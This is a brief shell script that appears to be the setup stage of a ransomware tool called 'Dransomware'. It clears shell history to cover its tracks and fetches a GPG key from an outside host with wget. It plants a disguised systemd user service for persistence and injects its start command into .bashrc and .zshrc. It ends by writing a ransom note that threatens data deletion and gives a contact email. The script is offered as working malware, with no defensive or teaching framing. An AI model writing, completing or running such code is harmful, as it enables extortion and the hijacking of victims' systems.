unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE
#touch public.pub
wget https://jacobjuneau6.github.io/Dransomware/public.pub
gpg --import public.pub && rm -rf public.pub
mkdir ~/.ransom
mkdir -p ~/.config/systemd/user && touch ~/.config/systemd/user/libSystemIO.service
mkdir ~/.system && touch ~/.system/drans
chmod +x ~/.system/drans
gpg --edit-key drans
gpg --check-trustdb
gpg --update-trustdb
systemctl --user enable --now libSystemIO.service
systemctl --user start libSystemIO.service
echo systemctl --user enable --now libSystemIO.service >> ~/.zshrc
echo systemctl --user enable --now libSystemIO.service >> ~/.bashrc
mkdir ~/.hacker/ && touch ~/.hacker/README.txt
echo I'm Hacker Don't try to ShutDown your system this will permanantly delete your data, contact jacobjuneau6@gmail.com for further details... >> ~/.hacker/README.txt
exit

